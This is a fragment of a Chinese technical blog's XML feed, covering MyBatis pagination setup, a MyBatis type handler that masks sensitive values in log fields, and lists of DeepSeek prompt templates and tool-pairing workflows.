<h3 id="3-2-配置拦截器（在mybatis-config-xml中）："><a href="#3-2-配置拦截器（在mybatis-config-xml中）：" class="headerlink" title="3.2 配置拦截器（在mybatis-config.xml中）："></a>3.2 配置拦截器（在mybatis-config.xml中）：</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span> <span class="attr">interceptor</span>=<span class="string">&quot;com.github.pagehelper.PageInterceptor&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;helperDialect&quot;</span> <span class="attr">value</span>=<span class="string">&quot;mysql&quot;</span>/&gt;</span> <span class="comment">&lt;!-- 指定数据库方言 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="3-3-Mapper-XML："><a href="#3-3-Mapper-XML：" class="headerlink" title="3.3 Mapper XML："></a>3.3 Mapper XML：</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectAllUsers&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    SELECT * FROM user</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="3-4-调用代码："><a href="#3-4-调用代码：" class="headerlink" title="3.4 调用代码："></a>3.4 调用代码：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">pageNum</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">pageSize</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">PageHelper.startPage(pageNum, pageSize);  <span class="comment">// 开启分页</span></span><br><span class="line">List&lt;User&gt; users = userMapper.selectAllUsers();</span><br><span class="line">PageInfo&lt;User&gt; pageInfo = <span class="keyword">new</span> <span class="title class_">PageInfo</span>&lt;&gt;(users);</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果说明：</span></span><br><span class="line"><span class="comment">// PageInfo对象包含分页信息</span></span><br><span class="line">pageInfo.getTotal();    <span class="comment">// 总记录数</span></span><br><span class="line">pageInfo.getPages();    <span class="comment">// 总页数</span></span><br><span class="line">pageInfo.getPageNum();  <span class="comment">// 当前页码</span></span><br><span class="line">pageInfo.getList();     <span class="comment">// 当前页数据</span></span><br></pre></td></tr></table></figure>
<p><strong>特点：</strong><br>优点：自动生成分页 SQL，支持多种数据库，性能高。<br>缺点：需引入第三方库。</p>
<h2 id="4-MyBatis-Plus-分页（集成方案）"><a href="#4-MyBatis-Plus-分页（集成方案）" class="headerlink" title="4. MyBatis-Plus 分页（集成方案）"></a>4. MyBatis-Plus 分页（集成方案）</h2><p>若项目使用 MyBatis-Plus，可直接使用其内置分页插件。<br>实现步骤：</p>
<h3 id="4-1-添加依赖："><a href="#4-1-添加依赖：" class="headerlink" title="4.1 添加依赖："></a>4.1 添加依赖：</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="4-2-配置分页："><a href="#4-2-配置分页：" class="headerlink" title="4.2 配置分页："></a>4.2 配置分页：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBatisPlusConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MybatisPlusInterceptor <span class="title function_">mybatisPlusInterceptor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">MybatisPlusInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MybatisPlusInterceptor</span>();</span><br><span class="line">        interceptor.addInnerInterceptor(<span class="keyword">new</span> <span class="title class_">PaginationInnerInterceptor</span>(DbType.MYSQL));</span><br><span class="line">        <span class="keyword">return</span> interceptor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-2-Mapper-接口："><a href="#4-2-Mapper-接口：" class="headerlink" title="4.2 Mapper 接口："></a>4.2 Mapper 接口：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;User&gt; &#123;</span><br><span class="line">    <span class="comment">// 无需定义分页方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-3-调用代码："><a href="#4-3-调用代码：" class="headerlink" title="4.3 调用代码："></a>4.3 调用代码：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">pageNum</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">pageSize</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">Page&lt;User&gt; page = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(pageNum, pageSize);</span><br><span class="line">IPage&lt;User&gt; userPage = userMapper.selectPage(page, <span class="literal">null</span>);</span><br><span class="line">List&lt;User&gt; users = userPage.getRecords();</span><br><span class="line"><span class="type">long</span> <span class="variable">total</span> <span class="operator">=</span> userPage.getTotal();</span><br></pre></td></tr></table></figure>
<p><strong>特点：</strong><br>优点：与 MyBatis-Plus 深度集成，支持 Lambda 表达式。<br>缺点：需引入 MyBatis-Plus 依赖。</p>
]]></content>
      <categories>
        <category>Mybatis</category>
      </categories>
      <tags>
        <tag>Mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title>Mybatis功能二【数据进行脱敏显示】</title>
    <url>/cnblogs.github.io/p/40359.html</url>
    <content><![CDATA[<h4 id="创建脱敏数据处理器"><a href="#创建脱敏数据处理器" class="headerlink" title="创建脱敏数据处理器"></a>创建脱敏数据处理器</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ibatis.type.BaseTypeHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.type.JdbcType;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.type.MappedJdbcTypes;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.type.MappedTypes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.CallableStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="meta">@MappedJdbcTypes(JdbcType.VARCHAR)</span></span><br><span class="line"><span class="meta">@MappedTypes(String.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SensitiveInfoTypeHandler</span> <span class="keyword">extends</span> <span class="title class_">BaseTypeHandler</span> &#123;</span><br><span class="line">    <span class="comment">// 关键字列表，实际开发中，关键字列表可以做成配置或在表中存储，这样可以更灵活</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEYWORD_PATTERN</span> <span class="operator">=</span> <span class="string">&quot;token|Authorization|password|email|keyword1|keyword2|keyword3&quot;</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">PATTERN</span> <span class="operator">=</span> Pattern.compile(KEYWORD_PATTERN);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNonNullParameter</span><span class="params">(PreparedStatement ps, <span class="type">int</span> i, String parameter, JdbcType jdbcType)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// 一般个人信息或敏感数据都要加密存储，可以参考文末给出的数据加解密处理方案，这里不处理</span></span><br><span class="line">        ps.setString(i, parameter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getNullableResult</span><span class="params">(ResultSet rs, String columnName)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// 对结果进行脱敏</span></span><br><span class="line">        <span class="keyword">return</span> desensitize(rs.getString(columnName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getNullableResult</span><span class="params">(ResultSet rs, <span class="type">int</span> columnIndex)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// 对结果进行脱敏</span></span><br><span class="line">        <span class="keyword">return</span> desensitize(rs.getString(columnIndex));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getNullableResult</span><span class="params">(CallableStatement cs, <span class="type">int</span> columnIndex)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// 对结果进行脱敏</span></span><br><span class="line">        <span class="keyword">return</span> desensitize(cs.getString(columnIndex));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">desensitize</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果字段中存在指定的关键字，则对关键字后面10位字符串使用***代替</span></span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> PATTERN.matcher(value);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(value);</span><br><span class="line">        <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> matcher.start() + matcher.group().length();</span><br><span class="line">            <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> Math.min(start + <span class="number">10</span>, result.length());</span><br><span class="line">            result.replace(start + offset, end + offset, <span class="string">&quot;***&quot;</span>);</span><br><span class="line">            offset += <span class="string">&quot;***&quot;</span>.length() - (end - start);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 返回脱敏后的数据</span></span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述代码中：</p>
<ul>
<li>KEYWORD_PATTERN 定义了一个包含多个关键字的正则表达式模式，关键字之间用 | 分隔。</li>
<li>desensitize 方法中，通过 Pattern 和 Matcher 来查找字符串中所有匹配关键字的位置。</li>
<li>使用 StringBuilder 来修改原始字符串，将关键字后的 10 位字符串替换为 ***。在替换过程中，考虑到替换字符串长度变化对后续位置的影响，通过 offset 变量进行修正</li>
</ul>
<h4 id="在Mapper-XML中使用"><a href="#在Mapper-XML中使用" class="headerlink" title="在Mapper XML中使用"></a>在Mapper XML中使用</h4><p> 示例中对请求头req_headers、响应体resp_body字段应用脱敏处理器<br> <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">     <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;BaseResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.example.demo.entity.Log&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;BIGINT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;url&quot;</span> <span class="attr">property</span>=<span class="string">&quot;url&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;req_headers&quot;</span> <span class="attr">property</span>=<span class="string">&quot;reqHeaders&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">typeHandler</span>=<span class="string">&quot;com.example.demo.typehandler.SensitiveInfoTypeHandler&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;resp_headers&quot;</span> <span class="attr">property</span>=<span class="string">&quot;respHeaders&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;resp_body&quot;</span> <span class="attr">property</span>=<span class="string">&quot;respBody&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">typeHandler</span>=<span class="string">&quot;com.example.demo.typehandler.SensitiveInfoTypeHandler&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;cost_time&quot;</span> <span class="attr">property</span>=<span class="string">&quot;costTime&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;BIGINT&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectUser&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;BaseResultMap&quot;</span>&gt;</span></span><br><span class="line">    SELECT id, url,</span><br><span class="line">           req_headers,</span><br><span class="line">           resp_headers,</span><br><span class="line">           resp_body,</span><br><span class="line">           cost_time</span><br><span class="line">    FROM logs</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Mybatis</category>
      </categories>
      <tags>
        <tag>Mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title>DeepSeek总结一【精选指令】</title>
    <url>/cnblogs.github.io/p/9b8a.html</url>
    <content><![CDATA[<ol>
<li>思维导图 ：为……主题制作一份结构清晰的思维导图。</li>
<li>竞品分析 ：深度分析……产品的主要竞争对手，包括优劣势对比。</li>
<li>创意脑暴 ：围绕……话题进行创意头脑风暴，提供10个不同方向的想法。</li>
<li>效率提升 ：分析我的……工作流程，提出3-5个提升效率的具体建议。</li>
<li>风险评估 ：识别……项目可能面临的风险，并制定应对策略。</li>
<li>学习路径 ：为想要掌握……的初学者设计一条循序渐进的学习路径。</li>
<li>话术优化 ：优化以下……场景的沟通话术，让表达更有说服力。</li>
<li>时间管理 ：制定一套适合……人群的时间管理方案。</li>
<li>品牌定位 ：为……产品&#x2F;服务制定清晰的品牌定位策略。</li>
<li>内容策划 ：策划一个月的……平台内容日历，包括主题和发布节奏。</li>
<li>故障排除 ：诊断……问题的根本原因，并提供系统性解决方案。</li>
<li>数据洞察 ：从以下……数据中挖掘3个关键洞察和商业机会。</li>
<li>用户画像 ：基于……信息构建详细的目标用户画像。</li>
<li>流程优化 ：梳理并优化……业务流程，减少冗余环节。</li>
<li>趋势预测 ：基于当前情况预测……领域未来6个月的发展趋势。</li>
<li>方案对比 ：对比……的几种解决方案，分析各自适用场景。</li>
<li>知识框架 ：构建……领域的完整知识框架体系。</li>
<li>场景演练 ：模拟……情况下的应对话术和行为策略。</li>
<li>成本分析 ：分析……项目的成本构成，找出节约空间。</li>
<li>转化优化 ：优化……环节的转化率，提供具体改进建议。</li>
<li>情绪管理 ：提供……情况下的情绪调节技巧和心理建设方法。</li>
<li>技能迁移 ：分析如何将我的……技能应用到……新领域。</li>
<li>复盘反思 ：对……经历进行复盘，总结经验教训和改进方向。</li>
<li>目标拆解 ：将……大目标分解为可执行的阶段性小目标。</li>
<li>资源整合 ：整合……方面的优质资源，建立个人资源库。</li>
<li>沟通策略 ：制定与……类型人群的有效沟通策略。</li>
<li>创新思维 ：运用……创新方法论重新审视……问题。</li>
<li>价值提炼 ：从……经历中提炼出可复制的价值和方法论。</li>
<li>场景化应用 ：将……理论知识转化为具体可操作的实践方案。</li>
<li>差异化定位 ：在……竞争激烈的市场中找到差异化定位点。</li>
<li>习惯养成 ：设计一套……天的习惯养成计划，包括激励机制。</li>
<li>决策框架 ：建立……类型决策的标准化框架和评判标准。</li>
<li>协作机制 ：设计……团队的高效协作机制和沟通规范。</li>
<li>知识变现 ：将我在……领域的专业知识转化为收入来源。</li>
<li>压力测试 ：对……方案进行压力测试，识别潜在脆弱点。</li>
<li>用户体验 ：从用户体验角度优化……产品&#x2F;服务的关键触点。</li>
<li>议题设定 ：为……会议&#x2F;讨论设定高效的议题和议程安排。</li>
<li>反馈机制 ：建立……工作的反馈收集和改进机制。</li>
<li>学习笔记 ：将……复杂内容整理成结构化的学习笔记。</li>
<li>应急预案 ：制定……突发情况的应急预案和处理流程。</li>
<li>绩效指标 ：为……工作设计合理的绩效评估指标体系。</li>
<li>自我包装 ：优化我在……领域的个人品牌包装和形象定位。</li>
<li>资源配置 ：合理配置……项目的人力、时间和预算资源。</li>
<li>市场调研 ：设计……市场的调研方案，包括调研方法和问题设计。</li>
<li>知识体系 ：构建……专业领域的系统性知识体系图谱。</li>
<li>执行清单 ：制定……项目的详细执行清单和检查节点。</li>
<li>影响力建设 ：提升我在……领域的影响力和话语权的策略。</li>
<li>生态思维 ：用生态系统思维分析……行业的价值链和合作机会。</li>
<li>迭代优化 ：建立……产品&#x2F;服务的快速迭代和持续优化机制。</li>
<li>护城河构建 ：为……业务构建可持续的竞争护城河和壁垒。</li>
</ol>
]]></content>
      <categories>
        <category>DeepSeek</category>
      </categories>
      <tags>
        <tag>DeepSeek</tag>
      </tags>
  </entry>
  <entry>
    <title>DeepSeek总结三【DeepSeek+工具手册】</title>
    <url>/cnblogs.github.io/p/f533.html</url>
    <content><![CDATA[<h2 id="一、DeepSeek-Kimi（快速生成PPT）"><a href="#一、DeepSeek-Kimi（快速生成PPT）" class="headerlink" title="一、DeepSeek + Kimi（快速生成PPT）"></a>一、DeepSeek + Kimi（快速生成PPT）</h2><p>适用场景：教学课件、工作汇报、商业策划等PPT制作。<br>步骤：</p>
<ol>
<li>生成PPT大纲：<br>在DeepSeek中输入明确需求，例如：“生成一份关于AI行业趋势分析的PPT大纲，包含技术发展、应用场景、未来预测等内容，以Markdown格式输出”。<br>开启“深度思考R1模式”以提升逻辑性，并复制生成的Markdown内容。</li>
<li>导入Kimi生成PPT：<br>登录Kimi官网，进入“PPT助手”功能，粘贴Markdown内容，点击“一键生成PPT”。<br>选择模板风格（如商务、科技等），预览后下载PPT文件，支持二次编辑（如添加Logo、调整配色）。</li>
</ol>
<h2 id="二、DeepSeek-即梦AI（图像设计）"><a href="#二、DeepSeek-即梦AI（图像设计）" class="headerlink" title="二、DeepSeek + 即梦AI（图像设计）"></a>二、DeepSeek + 即梦AI（图像设计）</h2><p>适用场景：IP形象设计、分镜制作、创意插画等。<br>步骤：</p>
<ol>
<li>生成提示词：<br>向DeepSeek输入需求，例如：“生成5组现代客厅设计的AI绘画提示词，包含风格、色彩、材质描述”。<br>细化要求如“增加自然光效”，输出结构化提示词。</li>
<li>即梦AI作图：<br>登录即梦AI官网，选择“AI作图”功能，粘贴提示词并选择模型（如通用XL Pro）。<br>生成图片后，通过局部重绘（如调整表情、背景）优化细节。</li>
<li>分镜动态化：<br>将静态图片导入可灵（Kling AI），输入简版画面描述（如“量子实验特写”），生成动态视频片段。</li>
</ol>
<h2 id="三、DeepSeek-豆包（高效知识管理）"><a href="#三、DeepSeek-豆包（高效知识管理）" class="headerlink" title="三、DeepSeek + 豆包（高效知识管理）"></a>三、DeepSeek + 豆包（高效知识管理）</h2><p>适用场景：笔记整理、跨语言翻译、团队协作。<br>步骤：</p>
<ol>
<li>信息采集与处理：<br>通过DeepSeek浏览器插件，一键保存网页内容（含图文）至豆包笔记。<br>使用DeepSeek的语音转文字功能，录制会议内容并保存至豆包。</li>
<li>智能优化与输出：<br>利用DeepSeek的“文本摘要”功能，自动生成长文核心摘要，节省阅读时间。<br>结合豆包的团队协作功能，分享笔记并启用DeepSeek协同编辑（如多语言翻译、语法纠错）。</li>
</ol>
]]></content>
      <categories>
        <category>DeepSeek</category>
      </categories>
      <tags>
        <tag>DeepSeek</tag>
      </tags>
  </entry>
  <entry>
    <title>DeepSeek总结二【工作与生活全场景指令】</title>
    <url>/cnblogs.github.io/p/1476.html</url>
    <content><![CDATA[<h2 id="日常生活类-10个"><a href="#日常生活类-10个" class="headerlink" title="日常生活类 (10个)"></a>日常生活类 (10个)</h2><p><strong>每日要闻速览：</strong>请汇总并深度解析今日的头条新闻事件，指出其背后的潜在影响。<br><strong>消费陷阱预警：</strong>针对[具体领域，如二手车交易、在线课程]，提供一份详尽的防骗避坑攻略。<br><strong>空间魔法整理术：</strong>请分享针对[具体物品，如换季衣物、厨房小家电]的高效收纳方案，最好能结合小户型空间。<br><strong>决策天平：</strong>请用表格形式，全面对比分析[某项选择，如“移居A城市” vs “留在B城市”]的优势、劣势、机会和威胁（SWOT分析）。<br><strong>私房菜谱定制：</strong>我想学做[一道菜名]，请为我量身定制一份菜谱，需包含食材准备、详细烹饪流程及关键诀窍。<br><strong>专属营养师：</strong>根据我的[身体状况、作息习惯、饮食偏好]，为我规划一份为期一周的均衡膳食计划，并说明理由。<br><strong>待办事项规划师：</strong>请帮我生成一份[具体场景，如长途搬家、出国旅行前一周]的准备工作清单，并按“十万火急”、“重要但不紧急”、“可以稍后处理”三个等级排序。<br><strong>个人形象顾问：</strong>我是[性别]，体型[如梨形、苹果形]，请为我推荐适合[特定场合或季节]的几套穿搭组合，并说明搭配逻辑。<br><strong>生活黑客：</strong>分享5个能显著提升生活幸福感的、普通人不知道的实用生活小技巧。<br><strong>业余生活规划：</strong>我想培养一项新爱好，请推荐几种不仅能消磨时光，还能提升个人技能（如逻辑思维、动手能力）的兴趣。</p>
<h2 id="职场办公类-10个"><a href="#职场办公类-10个" class="headerlink" title="职场办公类 (10个)"></a>职场办公类 (10个)</h2><p><strong>项目执行蓝图：</strong>请将[某个复杂的工作项目，如“新产品上市推广”]分解为可执行的步骤、关键里程碑和负责人。<br><strong>策略迭代：</strong>这里有一份[方案初稿]，请围绕[核心优化目标，如提升用户参与度]提出具体的、可量化的改进建议。<br><strong>工作日志助手：</strong>根据我今天完成的[列举几项工作内容]，为我生成一份专业的[岗位名称]工作日报，并提炼出今日亮点和待办事项。<br><strong>学术研究助理：</strong>请搜集关于[具体课题]的权威资料、研究报告或学术论文，并为每份资料生成一个三句话的核心内容摘要，同时注明出处。<br><strong>数据洞察报告：</strong>请分析这份[数据描述]数据集，总结核心发现，并用HTML&#x2F;CSS&#x2F;JS生成一个交互式图表来直观展示数据。<br><strong>演示文稿策划：</strong>我需要做一个关于[演示主题]的报告，请帮我构建PPT的核心框架、视觉风格建议，并撰写配套的、富有感染力的演讲词。<br><strong>效率神器推荐：</strong>我是[岗位名称]，请推荐一套能提升我工作效率的“神器”组合，包括但不限于软件工具、在线服务及浏览器扩展。<br><strong>职业路径导航：</strong>作为一名[岗位名称]，请为我规划未来3-5年的职业成长路径，需包含技能提升、关键项目经验、以及可能的晋升通道。<br><strong>文件管理体系：</strong>我是[岗位名称]，工作中常处理[多种文件类型]，请为我设计一套清晰、高效的数字文件命名与存储规则。<br><strong>转化率倍增计划：</strong>针对我们的[产品或服务名称]，设计一个能有效提升销售转化率的全流程方案，从潜在客户吸引到最终成交。</p>
<h2 id="自我提升类-10个"><a href="#自我提升类-10个" class="headerlink" title="自我提升类 (10个)"></a>自我提升类 (10个)</h2><p><strong>技能跃迁计划：</strong>我想系统性提升[某项具体能力，如公开演讲]，请为我设计一个分阶段的学习与实践方案，包含推荐资源。<br><strong>行业思维破壁：</strong>如何才能在[某个领域]建立超越大多数人的深刻认知？请提供具体的学习路径和推荐的思维模型。<br><strong>韧性心理学：</strong>请解释心理韧性（逆商）的关键组成部分，并提供在面对挫折时可以立刻使用的心理调适练习。<br><strong>勇闯未知领域：</strong>我感觉自己在[某个方面]陷入了舒适区，请设计一套“小步快跑、风险可控”的突破计划。<br><strong>自信重塑练习：</strong>在[社交、工作等]方面我缺乏自信，请给我一些可以每日练习、逐步增强自信的具体行动指令。<br><strong>积极心理暗示：</strong>请教我如何运用“积极归因”理论，重新解读生活中的不如意，从而培养乐观的思维习惯。<br><strong>创意肌肉锻炼：</strong>请分享几个可以在日常生活中进行的、用于锻炼创新思维和联想能力的小练习或游戏。<br><strong>私人健身教练：</strong>根据我的[身高、体重、健身目标、可用器械]，为我量身打造一个为期[时长，如四周]的详细健身与饮食日程表。<br><strong>人生罗盘校准：</strong>我感到迷茫，请提供一些能够帮助我探索内心热情、确立长期人生目标的自我反思练习或方法。<br><strong>跨时空对话：</strong>请你扮演一位经验丰富的前辈，对我这个[描述当前状态或年龄段]的人，分享三条你认为最宝贵的人生忠告。</p>
<h2 id="内容创作类-10个"><a href="#内容创作类-10个" class="headerlink" title="内容创作类 (10个)"></a>内容创作类 (10个)</h2><p><strong>灵感孵化器：</strong>我正在构思[领域或主题]的内容，请提供5个新颖的、有深度的、甚至有些反直觉的创作切入点。<br><strong>命题写作：</strong>请围绕[核心主题]，创作一篇结构完整、论点清晰、且包含一个生动故事案例的[字数要求]文章。<br><strong>视频魔术手：</strong>我想让视频呈现[某种风格，如电影感、Vlog风]，请教我关键的剪辑手法、BGM选择和调色技巧。<br><strong>爆款选题雷达：</strong>我是[某赛道]的创作者，请结合近期社会热点和用户深层心理需求，为我推荐10个有潜力成为爆款的选题方向。<br><strong>标题炼金术：</strong>我写了一篇关于[文章主旨]的文章，请帮我构思10个吸引眼球的标题，风格需涵盖疑问式、利益驱动式、悬念式和争议性。<br><strong>粉丝增长引擎：</strong>我的账号定位是[赛道&#x2F;领域]，请为我在[具体社交平台]设计一套系统性的、注重用户粘性的粉丝增长策略。<br><strong>视觉概念师：</strong>请为[活动或产品主题]构思一个海报设计方案，包括构图、色彩搭配和核心元素，并生成一段可以用于AI绘画的中文描述性指令。<br><strong>短剧本创作：</strong>请为我撰写一个时长约[分钟数]的短视频脚本，主题是[视频主题]，需要包含场景、台词、镜头提示和情绪转折点。<br><strong>素材资源库：</strong>请推荐一些高质量且版权友好的网站或工具，用于寻找[图片、视频、音乐、字体]等类型的创作素材。<br><strong>金牌广告语：</strong>请为[我的产品&#x2F;服务]，撰写一则能直击用户痛点、突出[核心卖点]的强吸引力广告文案，并提供长、中、短三个版本。</p>
<h2 id="人际交往类-10个"><a href="#人际交往类-10个" class="headerlink" title="人际交往类 (10个)"></a>人际交往类 (10个)</h2><p><strong>破冰对话大师：</strong>请提供一些在陌生场合自然开启对话的万能话题和“万能接话”技巧。<br><strong>关系升温计划：</strong>我想加深与[家人、朋友、伴侣]的情感联结，请为我设计一份具体的、可执行的行动指南。<br><strong>赞美的艺术：</strong>如何不落俗套地赞美一个人的[某个优点，如勤奋、善良]？请给出几个具体的话术范例。<br><strong>高情商回绝术：</strong>当面对[某个不想接受的请求]时，如何既能坚定立场又不伤害对方感情地进行委婉拒绝？请提供话术模板。<br><strong>人脉网络构建：</strong>在[特定行业或场合]，有哪些有效拓展职业人脉的策略？以及如何进行有意义的后期关系维护？<br><strong>职场微社交：</strong>请分享一些在办公室休息区、电梯间等非正式场合，与同事或领导轻松愉快交流的技巧和安全话题。<br><strong>社交圈拓展指南：</strong>除了工作，我想认识更多志同道合的新朋友，请推荐一些适合我的线下或线上社交活动&#x2F;社群。<br><strong>礼仪速成课：</strong>请详细介绍在[如商务晚宴、学术会议]这类社交场合中需要注意的核心礼仪规范。<br><strong>魅力初印象：</strong>即将在[某个重要场合]与[某人]见面，我该如何从言谈举止、着装甚至准备的话题上，留下极佳的第一印象？<br><strong>无限话题库：</strong>请为我生成30个适合与[聊天对象，如初次约会对象]展开的、旨在[聊天目的，如增进了解、氛围轻松]的深度聊天话题。</p>
